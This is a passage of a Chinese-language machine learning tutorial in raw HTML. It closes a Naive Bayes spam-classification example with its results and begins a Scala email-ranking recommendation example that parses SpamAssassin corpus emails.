&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-40&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-41&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;unknownClassifications&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-42&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;listOfSpam2Files&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-43&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;was &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;unknowingly &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;classified&lt;/span&gt;&quot;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-44&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0053 seconds] --&gt;
&lt;p&gt;如果以不同的特征数多次运行这段代码，就可以得到下列结果：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/f8cf1f3fc2c8d1ad89066d6f1c1473ad.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-59779&quot; src=&quot;/images/jobbole.com/1ba91528e33c42141e2fe792df1688e5.jpg&quot; alt=&quot;2344&quot; width=&quot;802&quot; height=&quot;127&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;注意，被标记为垃圾的邮件数量正是由模型所正确分类的。有趣的是，在只有 50 个特征的情况，这个算法分类垃圾邮件表现的最好。不过，考虑到在这50个最高频特征词中仍然有停用词，这个结果就不难解释了。若观察被分类为垃圾邮件的数目随特征数增加的变化（从 100 开始），可以看到，特征数越多，结果越大。注意还有一组被分为未知邮件。这些邮件在“正常”和“垃圾”两个类别中的先验值是相等的。这种情况也适用于那些其中未包含正常或垃圾邮件特征词的邮件，因为这样的话，算法会认为它有 50% 是正常邮件, 50% 是垃圾邮件。&lt;/p&gt;
&lt;p&gt;现在我们对正常邮件进行相同的分类过程。通过将变量 listOfSpam2Files 的路径改为 easyHam2Path，并重新运行该代码，我们可以得到以下结果：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/7ea14224b0e6414b7da40eeea48dde47.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-59780&quot; src=&quot;/images/jobbole.com/2151b75a08e0767272e4aa562b17e2ac.jpg&quot; alt=&quot;sdff&quot; width=&quot;799&quot; height=&quot;128&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;注意现在被正确分类的是那些被标记为“正常”的邮件。从这里可以看到，事实上当只用50个特征时，被正确分类为正常邮件的数目明显低于使用100个特征时的情况。你应该注意到这点并且对所有类别验证你的模型，就如在这个例子中，用垃圾邮件和正常邮件的测试数据对模型都做了验证。&lt;/p&gt;
&lt;p&gt;概括一下这个实例，我们演示了如何应用朴素贝叶斯算法来分类正常或垃圾邮件，并得到如下的结果：高达 87.26% 的垃圾邮件识别率和 97.79% 的正常邮件识别率。这表明朴素贝叶斯算法在识别正常或垃圾邮件时表现得确实相当好。&lt;/p&gt;
&lt;p&gt;朴素贝叶斯算法实例到这里就结束了。如果你还想多研究一下这个算法和垃圾邮件分类，文库里还有一组“困难级别的”正常邮件，你可以通过调整特征数、剔除更多停用词来尝试正确分类。&lt;/p&gt;
&lt;h2&gt;基于内容的邮件排序（推荐系统）&lt;/h2&gt;
&lt;p&gt;这个实例完全是关于建立你自己的推荐系统的。我们将基于如下特征对邮件进行排序：“发送人”、“主题”、“主题中的公共词汇”和“邮件正文中的公共词汇”。稍后我们会对实例中的这些特征一一做解释。注意在设计你自己的推荐系统时，你要自己定义这些特征，而这正是最困难的环节之一。想出合适的特征来非常重要，而且就算最终选好了特征，已有的数据往往可能无法直接利用。&lt;/p&gt;
&lt;p&gt;这个实例旨在教你如何选取特征以及解决在这个过程中使用你自己的数据时会遇到的问题。&lt;/p&gt;
&lt;p&gt;我们将会使用邮件数据的一个子集，这些邮件数据已在实例“垃圾/正常邮件分类”中使用过了。这个子集可以从&lt;a href=&quot;http://spamassassin.apache.org/publiccorpus/20030228_easy_ham.tar.bz2&quot;&gt;这里&lt;/a&gt;下载。此外，你还需要停用词文件。注意这些数据是一组接收到的邮件，因此我们还缺少一半数据，也就是这个邮箱发送出去的邮件。然而，就算没有这些信息，我们还是可以做一些相当漂亮的排序工作，待会儿就知道了。&lt;/p&gt;
&lt;p&gt;在我们开始建立排序系统之前，我们首先需要从邮件数据集中抽取出尽可能多的数据来。因为这些数据本身有点冗长，我们给出处理这个过程的代码。行内注释对代码的作用进行了解释。注意，该程序一开始就是一个在 GUI 中的 swing 应用。之所以这样做，是因为稍后我们要将数据绘成图以洞悉其隐含的模式。同时注意，我们直接将数据分割为测试数据和训练数据，为我们之后验证模型做准备。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06135f418088009&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
import java.awt.{Rectangle}
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import smile.plot.BarPlot

import scala.swing.{MainFrame, SimpleSwingApplication}
import scala.util.Try

object RecommendationSystem extends SimpleSwingApplication {

 case class EmailData(emailDate : Date, sender : String, subject : String, body : String)

  def top = new MainFrame {
    title = &quot;Recommendation System Example&quot;

    val basePath = &quot;/Users/../data&quot;
    val easyHamPath = basePath + &quot;/easy_ham&quot;

    val mails = getFilesFromDir(easyHamPath).map(x =&amp;gt; getFullEmail(x))
    val timeSortedMails = mails
      .map  (x =&amp;gt; EmailData (   getDateFromEmail(x),
                                getSenderFromEmail(x), 
                                getSubjectFromEmail(x), 
                                getMessageBodyFromEmail(x)
                            )
            )
      .sortBy(x =&amp;gt; x.emailDate)

    val (trainingData, testingData) = timeSortedMails
            .splitAt(timeSortedMails.length / 2)

      }

  def getFilesFromDir(path: String): List[File] = {
    val d = new File(path)
    if (d.exists &amp;amp;&amp;amp; d.isDirectory) {
      //Remove the mac os basic storage file, 
      //and alternatively for unix systems &quot;cmds&quot;
      //移除mac os的基本存储文件或者unix系统的“cmds”文件
      d.listFiles.filter(x =&amp;gt;   x.isFile &amp;amp;&amp;amp;
                                !x.toString.contains(&quot;.DS_Store&quot;) &amp;amp;&amp;amp;
                                !x.toString.contains(&quot;cmds&quot;)).toList
    } else {
      List[File]()
    }
  }

  def getFullEmail(file: File): String = {
    //Note that the encoding of the example files is latin1, 
    //thus this should be passed to the from file method.
    //注意案例文件采用latin1编码，因此应该把它们传递给fronFile方法
    val source = scala.io.Source.fromFile(file)(&quot;latin1&quot;)
    val fullEmail = source.getLines mkString &quot;n&quot;
    source.close()

    fullEmail
  }

  def getSubjectFromEmail(email: String): String = {

    //Find the index of the end of the subject line
    //找出主题行的结束标志
    val subjectIndex = email.indexOf(&quot;Subject:&quot;)
    val endOfSubjectIndex = email   
    .substring(subjectIndex)                        .indexOf(&#39;n&#39;) + subjectIndex

    //Extract the subject: start of subject + 7 
    // (length of Subject:) until the end of the line.
    //抽取主题：主题开端+7（主题的长度），直到该行结束
    val subject = email
    .substring(subjectIndex + 8, endOfSubjectIndex)
    .trim
    .toLowerCase

    //Additionally, we check whether the email was a response and 
    //remove the &#39;re: &#39; tag, to make grouping on topic easier:
    //此外，我们检查邮件是否是一封回复并删除“re：”标签，使对话题的分组更容易
    subject.replace(&quot;re: &quot;, &quot;&quot;)
  }

  def getMessageBodyFromEmail(email: String): String = {

    val firstLineBreak = email.indexOf(&quot;nn&quot;)
    //Return the message body filtered by only text 
    //from a-z and to lower case
    //返回过滤后的信息主体，即只包含a-z小写形式的文本
    email.substring(firstLineBreak)
    .replace(&quot;n&quot;, &quot; &quot;)
    .replaceAll(&quot;[^a-zA-Z ]&quot;, &quot;&quot;)
    .toLowerCase
  }

  def getSenderFromEmail(email: String): String = {
    //Find the index of the From: line
    //找出带有“From:”标志的行
    val fromLineIndex = email
    .indexOf(&quot;From:&quot;)

    val endOfLine = email
    .substring(fromLineIndex)
    .indexOf(&#39;n&#39;) + fromLineIndex

    //Search for the &amp;lt;&amp;gt; tags in this line, as if they are there,
    // the email address is contained inside these tags
    //在该行中搜索“&amp;lt;&amp;gt;”标签，如果标签存在，则邮件地址包含在其中

    val mailAddressStartIndex = email
    .substring(fromLineIndex, endOfLine)
    .indexOf(&#39;&amp;lt;&#39;) + fromLineIndex + 1

    val mailAddressEndIndex = email
    .substring(fromLineIndex, endOfLine)
    .indexOf(&#39;&amp;gt;&#39;) + fromLineIndex

    if (mailAddressStartIndex &amp;gt; mailAddressEndIndex) {

      //The email address was not embedded in &amp;lt;&amp;gt; tags,
      // extract the substring without extra spacing and to lower case
      //邮件地址不是括在&amp;lt;&amp;gt;标签内，抽取子字符串并去除空格，转为小写形式
      var emailString = email
      .substring(fromLineIndex + 5, endOfLine)
      .trim
      .toLowerCase

      //Remove a possible name embedded in () at the end of the line,
      //for example in test@test.com (tester) the name would be removed here
      //删除行末可能包含在()内的名字，例如，在test@test.com(tester) 中，名字会被删除掉
      val additionalNameStartIndex = emailString.indexOf(&#39;(&#39;)
      if (additionalNameStartIndex == -1) {
        emailString
        .toLowerCase
      }
      else {
        emailString
        .substring(0, additionalNameStartIndex)
        .trim
        .toLowerCase
      }
    }
    else {
      //Extract the email address from the tags. 
      //抽取标签中的邮件地址
      //If these &amp;lt;&amp;gt; tags are there, there is no () with a name in
      // the From: string in our data
      //我们的数据中，如果“From：”字符串存在标签&amp;lt;&amp;gt;，则不会有带()的名字出现
      email
      .substring(mailAddressStartIndex, mailAddressEndIndex)
      .trim
      .toLowerCase
    }
  }

  def getDateFromEmail(email: String): Date = {
    //Find the index of the Date: line in the complete email
    //在整封邮件中找出日期行的标志
    val dateLineIndex = email
    .indexOf(&quot;Date:&quot;)

    val endOfDateLine = email
    .substring(dateLineIndex)
    .indexOf(&#39;n&#39;) + dateLineIndex

    //All possible date patterns in the emails.
    //邮件中所有可能的日期格式
    val datePatterns = Array(   &quot;EEE MMM dd HH:mm:ss yyyy&quot;,
                                &quot;EEE, dd MMM yyyy HH:mm&quot;,
                                &quot;dd MMM yyyy HH:mm:ss&quot;,
                                &quot;EEE MMM dd yyyy HH:mm&quot;)

    datePatterns.foreach { x =&amp;gt;
      //Try to directly return a date from the formatting.
      //尝试用一种日期格式直接返回一个日期
      //when it fails on a pattern it continues with the next one
      // until one works
      //对于一种格式，当返回错误时，它接着尝试下一种格式直到成功。

      Try(return new SimpleDateFormat(x)
                    .parse(email
                            .substring(dateLineIndex + 5, endOfDateLine)
                            .trim.substring(0, x.length)))
    }
    //Finally, if all failed return null
    //最后，如果都失败了则返回null
    //(this will not happen with our example data but without 
    //this return the code will not compile)
    //（对于我们的案例数据，这不会发生，但是没有这一返回，代码就不会编译）
    null
  }
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-64&quot;&gt;64&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-65&quot;&gt;65&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-66&quot;&gt;66&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-67&quot;&gt;67&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-68&quot;&gt;68&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-69&quot;&gt;69&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-70&quot;&gt;70&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-71&quot;&gt;71&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-72&quot;&gt;72&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-73&quot;&gt;73&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-74&quot;&gt;74&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-75&quot;&gt;75&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-76&quot;&gt;76&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-77&quot;&gt;77&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-78&quot;&gt;78&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-79&quot;&gt;79&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-80&quot;&gt;80&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-81&quot;&gt;81&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-82&quot;&gt;82&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-83&quot;&gt;83&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-84&quot;&gt;84&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-85&quot;&gt;85&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-86&quot;&gt;86&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-87&quot;&gt;87&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-88&quot;&gt;88&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-89&quot;&gt;89&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-90&quot;&gt;90&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-91&quot;&gt;91&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-92&quot;&gt;92&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-93&quot;&gt;93&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-94&quot;&gt;94&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-95&quot;&gt;95&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-96&quot;&gt;96&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-97&quot;&gt;97&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-98&quot;&gt;98&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-99&quot;&gt;99&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-100&quot;&gt;100&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-101&quot;&gt;101&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-102&quot;&gt;102&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-103&quot;&gt;103&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-104&quot;&gt;104&lt;/div&gt;
